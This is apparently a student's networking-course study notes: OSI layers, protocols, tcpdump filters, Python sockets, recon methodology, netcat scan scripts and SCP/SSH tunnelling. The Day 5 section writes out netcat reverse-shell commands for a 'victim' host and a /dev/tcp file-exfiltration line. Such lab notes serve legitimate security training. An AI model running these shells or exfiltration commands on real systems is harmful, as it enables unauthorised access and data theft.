FG - https://net.cybbh.io/public/networking/latest/index.html
VTA Logon - networking-ctfd-1.server.vta:8000 (http://10.50.20.180:8000/)
Miro - https://miro.com/app/board/o9J_klSqCSY=/?share_link_id=16133753693
IP- ssh student@10.50.36.137 -X
http://networking-ctfd-1.server.vta:8000/login?next=%2Fuser%3F
User: KAEL-M-503
Password: 
Test Day - July 9th




Protocol Data Unit (PDU)
  Session-Application -> Data
  Transport -> Segment/Datagram
  Network -> Packet
  Data Link -> Frame
  Physical -> Bit


Internet Standards (Organizations)
  IETF = RFC
  IANA - Internet Numbers
    > # The ones that control who owns a set of IP's
  IEEE - LAN/WAN electrical standards
    > # Responsible for maintaining standards for protocols


============================= Layer 1 (Physical) ==================================
  # There are bits at this level
  # binary, decimal, hex, base64
  word = 32 bits
  half word = 16 bits
  byte = 8
  nibbles = 4
Topologies
> Bus
  > # Half-Duplex
  > # Straight line
> Star
  > # Switch is at the center of the star
> Ring
  > # Key that is shared with the devices in the ring
> Mesh
  > # Some are connected to each other, or all are connected to each other
> Wireless
  > # Wireless devices are connected to a modem
> Hierarchial 
  > # More aligned with an enterprise level company topology
  > # Firewalls, Different layers
Devices
> Hubs
  > # Everyone gets everything (Doesnt check frames that are sent)
  > # it broadcasts to all ports (Packet Collision)
> Repeaters
  > # Like hub, but amplifies signal so its stronger
> Switches
> Routers
  > # Based off of IP
Ethernet Timing (Bit-Time) ???????? <- (Research Later)
Speed        Bit-Time
10Mbps       100ns
100Mbps      10ns
1 Gps        1ns
10 Gbps     .1ns
100 Gbps    .01ns


============================= Layer 2 (Data-Link) ========================================
MAC (Medium Access Control)
  > # Transpose Layer 2 - 3 (Goes UP the OSI Model)
LLC (Logical Link Control
  > # Transpose to MAC Address (Goes DOWN the OSI Model)


Switch Operation
  # build MAC Address (CAM) Table
    > # Learns by reading source MAC Addresses
  # Forwarding Frames
    > # Decision based on destination MAC Address


> Switching Modes
  > Cut through
    > # Default Method
    > # Only check Destination MAC
  > Fragment-Free
    > # Stores first 64 bytes of the frame (Ethernet portion) before forwarding
  > Store-and-Forward
    > # Information is kept and sent at a later time to the destination
> Cam Table Overflow Attack  ?????????????/ <- (Research Later)
  > # Send frames with bogus source MAC Address to switch
  > # Cause switch to fill table with bogus addresses
  > # Switch will not be able to learn new (valid) MAC Addresses


MAC Addressing
> Length:  48-bit | 6 byte | 12 Hex
> Types
  > Unicast: One to One
    > # 8TH bit is off
  > Multicast: One to Many
    > # 8TH bit is off
  > Broadcast: One to All
    > # All bits on


Ethernet Header and Frame
> Mac Header/Trailer: 14 Bytes
> Data: 46-1500 Bytes
> EtherType
  > 0x0800 - IPv4
  > 0x0806 - ARP
  > 0x86DD - IPv6
  > 0x8100 - VLAN !!!!!!!!!!!


VLAN
# Splitting up a switch into virtual ports
> Trunk Link
  > # Joining two switches together with VLAN Ports as if they were physically connected with ethernet
> Types
  > # Default: VLAN 1
  > # Data - User Traffic
  > # Voice - VOIP Traffic
  > # Management - Switch and router managment
  > # Native - Untagged switch and router traffic
> Headers
  > # Header length is: 32 bits
  > # 802.1Q
  > # 802.1AD
> VLAN Hopping Attack
  > # Switch Spoofing (DTP)
  > # Single Tagging
  > # Double Tagging


ARP
> Types
  > ARP (OP 1 and 2)
    > # Requests info. Example: knows ip asks for mac (Location)
  > RARP (OP 3 and 4)
    > # The client requesting an IP Address from the server's gateway
  > Proxy ARP (OP 2)
    > # The host answering the ARP Request from whatever asked where they were
  > Gratuitous ARP (OP 2)
    > # The host broadcasts their location without the request
> ARP Cache
    > # A tables that has translations in it
    > # Collection of Address Resolution Protocol Entries


Man-In-The-Middle With ARP
  > # Causes victim machines to populate their ARP Cache with the MAC Address of the attacker's machine instead of the local router's MAC Address


VLAN Trunking Protocol (VTP)
  > # Dynamically add/remove/modify VLANs
> Cisco Proprietary
> Modes
  > Server
  > Client
  > Transparent
> Vulnerablities
  > Spoofing Attacks

Dynamic Trunking Protocol (DTP)
> # Used to dynamically create trunk links
> Vulnerabilities
  > # Can send crafted messages to form a VLAN trunk link
  > # On By Default
  > # Recomment to:
    > # Disable and manually access trunk link

CDP (Cisco Discovery Protocol)
  # Network Discovery tool or admins that identifies the neighbors
FDP (Foundry Discovery Protocol)
  # Proprietary data link layer protocol
LLDP (Link Layer Discovery Protocol)
  # Neighbors are able to find each other on the local network (principally wired Ethernet)


Spanning Tree Protocol (STP)
  # Layer 2 network protocol used to prevent looping within a network topology 
  # Always forward traffic in specific patterns
  # packets stuck in a loop is a broadcast storm
	  > # STP is a method to prevent this as it disables temporarily any link that is not the best route out. Redundancy can still be in place as a backup
> Types
  > # 802.1D STP
  > # Per VLAN Spanning Tree + (PVST+)
  > # 802.1w - Rapid Spanning Tree Protocol (RSTP)
  > # Rapid per VLAN Spanning Tree + (RPVST+)
  > # 802.1s (Multiple Spanning Tree)
> route bridge selection route out of the network
> spanning tree attack
	# can craft a bdu to deny service with a false/erroneous/spoofed bridge
> Port Security
	> # Restrict – block without shutting down
	> # protect- lets through but logs the mac
	> # shutdown – is shutdown
> Vulnerabilities
  > # Dependent on MAC Addresses
  > # MAC Spoofing
> Mitigiation techniques Layer 1
  > # Shutdown unused ports
  > # Enable Port Security
  > # IP Source Guard
  > # Manually assign STP Root
  > # BPDU Guard
  > # DHCP Snooping
> Mitigation Techniques Layer 2
  > # 802.1x
  > # Dynamic ARP inspection (DAI)
  > # Static CAM Entries
  > # Static ARP Entries


============================== Layer 3 (Network) ============================
IPv4 (0x0800)
> Classful subnetting
  > Class A (0-127)
  > Class B (128-191)
  > Class C (192-223)
  > Class D (224-239)
  > Class E (240-255)
> Classless subnetting (CIDR)
> NAT
> TTL
  > Linux (64)
  > Windows (128)
  > Network Devices
> Types
  > Unicast
  > Multicast
  > Broadcast
> Scopes
  > Public
  > Private (RFC 1918)
  > Loopback (127.0.0.1)
  > Link-Local (APIPA)
  > Multicast (class D)
> Fragmentation
  # Breaking up packets from higher MTU to lower MTU (Maximum Transmission Unit) network
  # Performed by routers
  # MF Flag is on from 1st until 2nd to last
  # offset is on from 2nd until the last
  # offset = (MTU - (IHL x 4)) / 8
> Auto Config
  > APIPA
  > DHCP
    > DORA
> Vulnerability 
  > Rogue DHCP
  > Evil Twin
  > DHCP Starvation 
    # Denial of service
IPv6 (Standardized 2017)
> Fragmentation
  > # Does not support fragmentation within its header
  > # Routers do not fragment IPv6 packets !!!!!!!!!!!!!1
  > # Source adjusts MTU to avoid Fragmentation
  > # Source can use IPv6 fragmentation extension header
> Addressing
  > # 128 bit addressing
> Subnetting
  > # Organizations assigned a 48-bit Prefix by IANA
> Types
  > Unicast
  > Multicast
  > Anycast
ICMPv4
  # IPv4 Protocol
> OS Fingerprinting
  > Linux
    > # Default Size: 64 Bytes
    > # Payload Message: nfo/./.345/.,0u98fgoij
  > Windows:
    > # Default Size: 40 Bytes
    > # Payload Message: abcdefghijklmnopqrstuvwxyz
> Traceroute
  > # Identifies Hops between the source and the destination
  > # Uses incrimenting ttls
  > # Uses ICMP (windows default), UDP (linux default), TCP
> Attacks
  > # Firewalking (Traceroute)
  > # Oversized ICMP Messages
  > # ICMP Redirects
  > # SMURF Attack
  > # Map Network w/ IP unreachables
  > # ICMP Covert Channels

(Classful)
  > # Do not Carry subnet mask information within the routing updates
  > # Exchange routing updaates at the regular time intervals
(Classless)
  > # Opposite of both

Routing Protocol
> # Used Between Layer 3 devices to learn and advertise routes and maintain routing tables
> # Routes a routed protocol for learning and maintaining routing table
Routed Protocol
> # Used between Routers to direct use traffic. It is also called network protocols
> # Routed by routing protocols


IGP and EGP
> IGP (Interior Gateway Protocols)
  > # Routing protocols that are used within an Autonomous System (AS).
  > # Referred to as intra-AS routing.
  > # Organizations and service providers IGPs on their internal networks.
  > # IGPs include RIP, EIGRP, OSPF, and IS-IS.
> EGP (Exterior Gateway Protocols)
  > # Used primarily for routing between autonomous systems.
  > # Referred to as inter-AS routing.
  > # Service providers and large companies will interconnect their AS using an EGP.
  > # The Border Gateway Protocol (BGP) is the only currently viable EGP and is the official routing protocol used by the Internet.
> OSPF
> RIPv2
> EIGRP
> ISIS

Distance Vector Routing Protocols
> # They share entire routing tables with their directly connected neighbors and from these shared tables they determine:
  > Distance
    > # How far away the destination network is from the outer and is based on a metric such as the hop count, cost, bandwidth, delay
  > Vector
    > # Specifies direction to the remote network
Link State Routing Protocols
>  Each router receives an LSA (Link State Adverstisement) and begins to build a map of the entire network


Routing Protocol Vulnerabilities
> DDOS
> Packet Mistreating Attacks (PMA)
> Routing Table Poisoning (RTP)
> Hit and Run DDOS (HAR)
> Persistence Attacks (PA)


BGP
> # Roadmap of the internet
> # Routes traffic between AS Number
> # Advertises IP CIDR address blocks
> # Establishes Peer relationships
> # Complicated Configuration
> # Complicated and slow path selection
> BGP Hijacking
  > # This works by illegitimate advertising of addresses, and takes over the CIDR address blocks corrupting the internet routing tables by falsifying the advertising addresses


Static Routing
> # Manually Configured routes
> # They dont advertise over the network
> # They dont use bandwidth


Dynamic Routing
> # Discover new remote networks
> # Maintaining current routing information
> # Choose the best path to remote networks
> # Recalculate a new path to a remote network should the primary fail


=========================== Layer 4 (Transport) ============================
Well-Know Ports: 0-1023
Registered : 1024-49151
Dynamic: 49152-65535


TCP Flags:
> CWR - 128
> ECE - 64
> URG - 32
> ACK - 16
> PSH - 8
> RST - 4
> SYN - 2
> FYN - 1


========================== Layer 5 (Session) ==================================
VPN
> # Encasulate a private IP through public IPs
> Types
  > # Remote Access VPN
  > # Site-to-Site VPN
  > # Client-to-Site VPN


L2TCP
> # Tunneling Protocol Cisco uses


IPSEC
> # Suite of protocols used to secure IP Communications by providing 3 triad of security at layer 3
> Transport Mode
  > # Only encrypts the payload of the original IP packet leaving the original IP header intact
> Tunnel Mode
  > # IP gets encapsulated and gets a new ip packet by adding an additional ip header
  > # Creates a secure VPN


Proxy
> # Functions as a messenger (An intermediary)
> # EXAMPLE: We want to give Bob a secret santa gift (He wont know it was us who have it to him), instead we use a messenger to give the present to Bob.



Socks
> # TCP ONLY!
> # Forwards TCP Traffic (Proxychains)


Netbios (Examine Network Basic Input Output System)
> # Name Resolution
> # TCP 139, UDP 137/138


SMB
> # TCP 139/445 and DUP 137/138
> # Acilitate the sharing of files, printers, serial ports, and various communications among network nodes


RPC (Examine Remote Procedure Call)
> # allows a program to request a service from another program located on the same system or on remote computer


API
> # Framework of rules and protocols for software components to interact
> # Methods, parameters, and data formats for requests and responses


======================= Layer 6 (Presentation) =====================
Responsibilities
> Translation
> Formating
> Encoding
> Encryption (Symmetric and asymmetric)
> Compression


======================== Layer 5 (Application) ===============================
Telnet
> Port 23
> Remote Login
> Authentication


SSH
> Port 22
> Remote Login
> Encrypted
> Asymmetric or PKI for key exchange
> User authentication
> Architecture
  > # User Key - Aymmetric public key used to identify the user to the server
  > # Host Key - Asymmetric Public key created to identify a server to a user
  > # Session Key - Symmetric Key created by the client and the server that protects the communication for a particular session
> First Connect
  > # RSA Key is saved to /home/<user>/.ssh/known_hosts file !!! Probably Important !!!
> Reconnect
  > # Wont prompt because the host is saved in the known_hosts file
> # If SSH gives an error that the rsa key is changed use this command:
  /> ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
> View/change the ssh port, cat the known_hosts file and grep for port to check, and use vi to edit the file and change the port


HTTP(S) (TCP 80/443)
> User Request Methods
  > # GET / HEAD / POST / PUT
> User response codes
  > # 100,200,300,400,500
> Vulnerabilities
  > Flooding
  > Amplicification
  > Low and slow
  > Drive-by Downloads
  > BeEF Framework


DNS
> UDP 53 (Handles Queries/Responses)
> TCP 53 (Zone Transfer)
  > # When the server shares the domain information


FTP
> Port 21
  > # command and control
> Port 20
  > # Data
> Modes
  > # Active (Initiated on Port 21) <- Default
  > # Passive (Uses both ports)


TFTP (Port 69)
> # Clear-Text
> # Reliability provided at the application layer


SMTP (Port 25)
> # Internet standard used for sending electronic mail


POP (Port 110)
> # Used to retrieve electronic mail from a server


IMAP (Port 143)
> # Download electronic mail from a server


DHCP (UDP Port 67/68)
> # Assigns IP Address parameters across an enterprise


NTP (UDP Port 123)
> # Allows for clock sync between computers over packet-switched data networks


TACACS (Port 49)
> # Used for centralized authentication, authorization, and accounting.
> # Cisco


RADIUS (UDP 1645/1646 AND 1812/1813)
> # Open source networking protocol used for centralized autentication, authorization and accounting


SNMP (UDP Port 161/162)
> # Collects and organizes information about managed devices on IP networks


RTP
> # Streaming in real-time media over IP networks, designed for transmitting audio and video when speed is of essense


RDP (Port 3389)
> # Remote Desktop


Kerberos (UDP Port 88)
> # Network authentication protocol that ensures secure authentication for client-server applications.


LDAP (Port 389 and 636)
> # Accessing and managing distributed directory information services


-----------------------------------------------------------------------------------------------------DAY 2---------------------------------------------------------------------



============== Network Traffic Sniffing ================
 Packet Capture Libraries
> LibCap
> WinPcap
> NPcap
Tools And Methods
> Disadvantages
  > # Can only capture what NIC can see
  > # Cannot capture local traffic
  > # Lost packets on busy networks
  > # Requires elevate permissions
  > # Can sonsume massive amounts of local storage


Packet Sniffers
> Hardware
  > # Something that can be plugged in to capture packets (Not Software)
> Software
  > # Wireshark


Socket Types
> User Space Sockets
  > # Stream Socket (Normally used with TCP/SCTP)
  > # Datagram Socket (Normally used with UDP)
  [EXAMPLE tcpdump]
> Kernel Space Sockets
  > # Raw Socket (receiving of IP packets without automatic protocol-specific transport layer formatting)


Types of Sniffing
> Active
  > # Actually interacting with the device
  > # OS Fingerprinting
  > # Nmap scan
> Passive
  > # Listening to all traffic (All look no touch)


Interface Naming
> Traditional
  > # eth0, eth1
> Consistent
  > # en0, en1


TCPDUMP Primitives
> User Friendly cpature expressions
  > # src or dst
  > # host, net, port, portrange


TCPDUMP Options !!!!!!!!!!
> -A
  > # Prints frame payload in ASCII
> -D
  > # Print list of network interfaces available on the system
> -i
  > # Select a different interface
> -e
  > # Prints data-link headers
> -r 
  > # Reads from pcap
> -w
  > # Writes the capture to an output file
> -X
  > # Displays packet data in hex
> -XX
  > # Displays everything in hex (Including Layer 2)
> -vv
  > # Gives verbose output with detail on the TTL, IPID, ect.
> -n
  > # Does not convert protocol and addresses to names
  [EXAMPLE]
  /> tcpdump port 80 or 22 -vn
    > # TCPDUMP for specific protocol traffic
/> tcpdump <pcap> -XX -vv
  > # Magic command (Gives everything)
/> tcpdump <protocol>

Compare Primitives and BPFS
> Primitives [MORE SIMPLE]
  > # CMU/Stanford Packet Filter (CSPF) Model commonly called Boolean Expression Tree
  > # Simple and easy filter expressions
  > # First user-level packet filter model
  > # Memory-stack-based filter machine which can create bottlenecks on model CPUs
  > # can have redundant computations of the same information
> Berkley Packet Filters (BPF) [MORE COMPLICATED BUT CAN BE MORE SPECIFIC]
  > # Control Flow Graph (CFG) Model
  > # Uses a simple (non-shared) buffer model which can make it 1.5 to 20 times faster than CSPF
  > # Can be more complex to create expressions but offer far more precision
  > # Faster because you can set it to look at specific things and doesnt show you bloated information (Saves Computational Power)


Kernel API
> TCPDUMP requests a RAW Socket creation
> Filters are set using the SO_ATTACH_FILTER
  > # Allows us to attach a bpf to the socket to capture the incoming packets


BPF Virtual Machine
> Consists of an accumulator
> Index register
> Scratch memory store


TCPDump filtering with BPF’s and bit-masking [SYNTAX] !!!!!!!!!!
----[ tcpdump {A} [B:C] {D} {E} {F} {G} ]----
> A = Protocol (ether | arp | ip | ip6 | icmp | tcp | udp)
> B = Header Byte number
> C = optional: Byte Length. Can be 1, 2 or 4 (default 1)
> D = optional: Bitwise mask (&)
> E = Operator (= | == | > | < | <= | >= | != | () | << | >>)
> F = Result of Expression
> G = optional: Logical Operator (&& ||) to bridge expressions

[EXAMPLE]
  /> tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != 22 || tcp[2:2] != 23)'


BitWise Masking
> Can Read 1 (BYTE), 2 (HALF-WORD), or 4 (WORD)
> Will only filter the byte level (alone)
[EXAMPLES]
  /> tcpdump 'ether[12:4] & 0xffff0fff = 0x810000abc'
    > # looking at the vlan header (8100 header)
 > oxffff0ffff
     ||||-||||
 >   810000abc
  > # [f] is all bits on
  > # [0] is no bits
 > # fc is the same as 0xffff00
  /> tcpdump 'ip[1] & 252 = 32'




--------------------------------------------------------------------------------------------DAY 3------------------------------------------------------------------------------------------

127.0.0.1 is important for some reason local host??? loopback? its who we are going to


 python3 ./sock_stream.py
nc -lvp 1111



python3 ./dgram_client.py

dgram nc -lvup 2222




Encode text to Hex:
echo "Message" | xxd




Encode file to Hex:
xxd file.txt file-encoded.txt


Decode file from Hex:
xxd -r file-encoded.txt file-decoded.txt




Net Recon Method

Host Discovery
	Ruby ping sweep if ping available
	nmap scan if no ping
Port Discovery
	 nmap
	 nc scan script
port Validation
	Banner grabbing using nc
Follow on actions based on ports found
	if 21 ftp ip [addr] connects to ftp server
		passive
		ls
		get [file name]
	if 21 or 80 wget -r IP_ADDRESS (or) wget -r ftp://IP_ADDRESS (or) firefox
	if 22 or 23 CONNECT and PASSIVE RECOn



Scan Methodology
 nmap -Pn [IP Addr] -T4 -p 21-23,80
	Quick Sca Ports 21-23, 80
	Specific ports based on hints/clues found
	Well known port range
	which tcpdump wireshark nmap telnet get curl ping

	0-1023 (Actaully scan 1-1023)
	Chunks of 2000 or first 10000 ports (65535)




Passive Recon Methodology
	Italicized/bolded words are comands

	Command: Hostname
	permissions:
		sudo -l
	interfaces and subnets
		ip a # Shows ips and cidrs
	Neighbors
		ip neigh # Find neighbors that nmap might not find
	files of interest
		find / -iname flag*2>/dev/null #dev/null part gets rid of errors
		find / -iname hint*
	Other listening ports
		ss -ntlp # Finds all tcp listening ports n is name resoloution see 22 instead of "ssh"
	Available tools
		which tcpdump wireshark nmap telnet get curl ping



Socket Types
> Stream Sockets (TCP)    <- (User) Space Sockets
> Datagram Sockets (UDP)    <- (User) Space Sockets
> Raw Sockets (Configure)    <- (Kernel) Space Sockets
  > # Tells hardware to just send it out because we are going to be configuring it. Thats why it requires SUDO


User Space
> # NMAP no switches
> # TCPDUMP or wireshark to read a file
> # Using netcat to connect to a listener (Dont use SUDO to banner grab)
> # Using netcat to create a listener above the well known port range (1024+)
Kernel Space
> # Capturing packets on the wire
> # OS Identification or to set specific flags when scanning
> # Using scapy to craft or modify a packet for transmission
> # Using python to craft or modify RAW sockets for transmission
> # Network devices using routing protocols such as OSPF
> # Any traffic without Transport Header (ICMP)


Python
> import {module}
> from {module} import *
  > # allows to call functions from module like the function was literally inside your code so instead of example.funct() it would just be funct()
> socket.socket [ SYNTAX: socket.socket( <family>, <type>, <proto> ) ] (import socket)
> Family
  > # AF_INET*
  > # AF_INET6
  > # AF_UNIX
    > # What daemons use to speak to hardware
> Type
  > # SOCK_STREAM* (TCP)
  > # SOCK_DGRAM (UDP)
> Proto
  > 0*
  > # IPPROTO_TCP
  > # IPPROTO_UDP
  > # IPPROTO_IP
  > # IPPROTO_ICMP
  > # IPPROTO_RAW
> Functions
  > # connect() [CLIENT-SIDE CONNECTION]
  > # close() [CLOSES TCP CONNECTION (Client/Server)]
  > # sendto()
    > # this sends data to a socket while not already being connected to a remote socket



Socket Functions
> Client
  > socket(family, type, proto)
  > Connect((ip, port))
    > # TCP Only
  > send()
    > # Send to established Socket
  > sendto()
    > # Send to UNenstablished socket
  > sendall()
    > # Repeats 'send' until all data sent
  > recv()
    > # Receive data from socket
  > recvfrom()
    > # Recieve data and socket info
  > close()
    > # Close a socket file descriptor
> Server
  > socket
  > setsockpot(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
  > bind((",port))
  > listen(1)
    > # Enable a server to accept TCP connections
  > accept()
    > # TCP only
  > recv()
    > # Receive data from socket
  > recvfrom()
    > # Recieve data and socket info
  > send()
    > # Send to established Socket
  > sendto()
    > # Send to UNenstablished socket
  > sendall()
    > # Repeats 'send' until all data sent
  > close()
    > # Close a socket file descriptor




[SOCKET SCRIPTS Stream, Dgram, Ipraw, Tcpraw]
Stream (What to change)
  > # Message (Optional)
Dgram
  > # Message (Optional)
IPRaw
  > # dst_ip
  > # ip_ver_ihl
  > # ip_tos
  > # ip_id
  > # ip_frag = 0
  > # ip_ttl
  > # ip_proto
  > # Message (Optional)
TCPRaw
  > # dst_ip
  > # dst_ip
  > # ip_ver_ihl
  > # ip_tos
  > # ip_id
  > # ip_frag = 0
  > # ip_ttl
  > # ip_proto
  > # tcp_src
  > # tcp_dst
  > # tcp_ack_seq
  > # tcp_data_off
  > # tcp_reserve
  > # tcp_flags (Optional if you want to just set a hex value instead of individual flags
  > # tcp_win
  > # tcp_chk = 0
  > # tcp_urg_ptr = 0
  > # Message (Optional)



Encoding 
> Text to Hex
  /> echo "Message" | xxd
> File to Hex
  /> xxd file.txt file-encoded.txt
> Decode file from Hex
  /> xxd -r file-encoded.txt file-decoded.txt
> Python Hex Ecoding
  # import binascii
  # message = b'Message'
  # hidden_msg = binascii.hexlify(message)

====================================== METHODOLOGIES ============================================

Net Recon Methodology
> Host Discovery
  > # Ruby ping sweep (if ping sweep available)
  > # NMAP scan if no ping
> Port Discovery
  > # NMAP
  > # nc scan script
> Port Validation
  > # Banner grabbing using nc
> Follow-on actions based on ports found
  > # if 21 FTP [IP ADDR] connects to ftp server
    /> passive
    /> ls
    /> get [filename]
  > # if 21 or 80 wget -r IP_ADDRESS (or) wget -r ftp://IP_ADDRESS (or) firefox
  > # if 22 or 23 CONNECT and PASSIVE RECON
> PASSIVE RECON

Scan Methodology
/> nmap -Pn [IP Addr] -T4 -p 21-23,80
  > # "-Pn" is no host discovery. Its telling nmap that we know its up. No pinging
  > # Quick Scan Ports 21-23, 80
  > # Specific ports based on hints/clues found
  > # Well know port range 1-1023
  > # which tcpdump wireshark nmap telnet get curl ping
  > # Chunks of 2000 or first 10000 ports (65535)

Passive Recon Methodology
/> hostname
  > # permissions:
    /> sudo -l
> Interfaces and subnets
  /> ip a
> Neighbors
  /> ip neigh
> Files of interest
  /> find / -iname flag* 2>/dev/null
  /> find / -name hint*
> Other listening ports
  /> ss -ntlp (TCP)
  /> ss -nulp (UDP)
> Available Tools
  /> which
  /> tcpdump
  /> wireshark
  /> nmap
  /> telnet
  /> get
  /> curl
  /> ping


















----------------------------------------------------------------------------------------DAY 4--------------------------------------------------------

more /etc/p0f/p0f.fp

sudo p0f -i eth0

sudo p0f -r test.pcap


Netscan TCP SCRIPT


#!/bin/bash
echo "Enter network address (e.g. 192.168.0): "
read net
echo "Enter starting host range (e.g. 1): "
read start
echo "Enter ending host range (e.g. 254): "
read end
echo "Enter ports space-delimited (e.g. 21-23 80): "
read ports
for ((i=$start; $i<=$end; i++))
do
    nc -nvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
done



NETSCAN UDP Script


#!/bin/bash
echo "Enter network address (e.g. 192.168.0): "
read net
echo "Enter starting host range (e.g. 1): "
read start
echo "Enter ending host range (e.g. 254): "
read end
echo "Enter ports space-delimited (e.g. 21-23 80): "
read ports
for ((i=$start; $i<=$end; i++))
do
    nc -nuvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
done



Ping Scanning
ping -c 1 172.16.82.106

for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done

sudo nmap -sP 172.16.82.96/27

-sU scans udp ports need root permissions so use SUDO!!!!!

---------------------------------------------------------------------------------------------------------DAY 5---------------------------------------------------------------------------------------------


Reverse shell COMES UP IN SECURITY!!!

First listen for the shell on your device

nc -lvp 9999


on victim using -c

nc -c /bin/bash 10.10.0.40 9999


on victims using -e

nc -e /bin/bash 10.10.0.40 9999

TUNNEL TIP
> # Two things you need are:
  > # Loopback
  > # Port used for the tunnel


Common Methods for transfering data
> FTP
  > Active (You order Pizza Delivery, they give you the data)
  > Passive (You order pizza to pickup, you get the data from them)
> SFTP [SECURE]
  > TCP Transport (22)
> SCP
  > # Uses ssh to transport files
  > # Symmetric and Asymmetric encryption
  /> . (present working directory)
  /> -v (verbose mode)
  /> -r (recursively copy an entire directory)
  /> -3 (3 way copy)

  [SCP SYNTAX]
  /> scp student@172.16.82.106:secretstuf.txt /home/student
    > # Download file from remote to local
  /> scp secretstuf.txt student@172m16m82,106:/home/student
    > # Copy a file from remote to local
  /> scp -3 student@172.16.82.106:/home/student/secretstuf.txt student@172.16.82.112:/home/student
    > # 3rd party copying. You are computer c and you are copying stuff from computer a to b
  /> scp -r folder/ student@172.16.82.106:
    > # Recursive upload of a folder to remote
  /> scp -r student@172.16.82.106:folder/ .
    > # Recursive download of a folder from remote

  [SCP SYNTAX W/ ALTERNATE SSHD]
  /> scp -P 1111 student@172.16.82.106:secretstuff.txt .
    > # Download a file from a remote directory to a local directory
  /> scp -P 1111 secretstuff.txt student@172.16.82.106:
    > # Upload a file to a remote directory from a local directory

  [SCP SYNTAX THROUGH A TUNNEL]
  /> ssh student@172.16.82.106 -L 1111:localhost:22 -NT
    > # Create a locl port forward to target device
  /> scp -P 1111 student@localhost:secretstuf.txt /home/student
    > # Download a file from a remote directory to a local directory
  /> scp -P 1111 secretstuff.txt student@localhost:/home/student
    > # Upload a fole to a remote directory from a local directory

  [SCP SYNTAX THROUGH A DYNAMIC PORT FORWARD]
  /> ssh student@172.16.82.106 -D 9050 -NT
    > # Create a Dynamic port forward to target device
  /> proxychains scp student@localhost:secretstuff.txt .
    > # Download a file from a remote directory to a local directory
  /> proxychains scp secretstuf.txt student@localhost:
    > # Upload a file to a remote directory from a local directory


Conduct Uncommon Methods of File Transfer
> Netcat (Reads a writes data across network socket connections using TCP/IP protocol)
  [CLIENT TO LISTENER FILE TRANSFER]
  /> nc -lvp 9001 > newfile.txt
    > # Listener (receive file)
  /> nc 172.16.82.106 9001 < file.txt
    > # Client (sends file)

  [LISTENER TO CLIENT FILE TRANSFER]
  /> nc -lvp 9001 < file.txt
    > # Listener (sends file)
  /> nc 172.16.82.106 9001 > newfile.txt
    > # Cleint (recieve file)

  [NETCAT RELAY LISTENER TO LISTENER]
  /> mknod mypipe p (makes node) or mkfifo mypipe
    > nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe

  [EXAMPLE DIAGRAM]
              nc -lvp 1111 < mypipe | nc -lvp 2222 > mypipe
  
          [1]   ----->            [2]             <-----  [3]
         nc [2] 1111                              nc -lvp 1111
                                                  (nc [2] 2222)

  [NETCAT RELAY CLIENT TO CLIENT]
  /> nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe


  [FILE TRANSFER WITH /DEV/TCP]
  /> nc -lvp 1111 > devtcpfile.txt
    > # On the recieving box
  /> cat secret.txt > /dev/tcp/10.10.0.40/1111
    > # This method is useful for a host that does not have NETCAT available

Reverse shell using NetCat
/> nc -lvp 9999
  > # First listen for the shell on your device
/> nc -c /bin/bash 10.10.0.40 9999
  > # On victim using -c
/> nc -e /bin/bash 10.10.0.40 9999
  > # On victim using -e

XXD
/> echo "Hex encoding test" | xxd -p
/> echo "48657820656e636f64696e6720746573740a" | xxd -r -p




---------------------------------------------------------------------------------------DAY 6 (Pre notes?)--------------------------------------------------------------------------------------------

Covert Channels legit means to transfer malware or do some sort of malicous activity look at things like payload size and other abnormalities based on protocol of traffic being used.



On ssh -L opens local port on your machine B: is a hop after your ssh and -R opens port on immediate machine you are sshing onto. Localhost:another local port









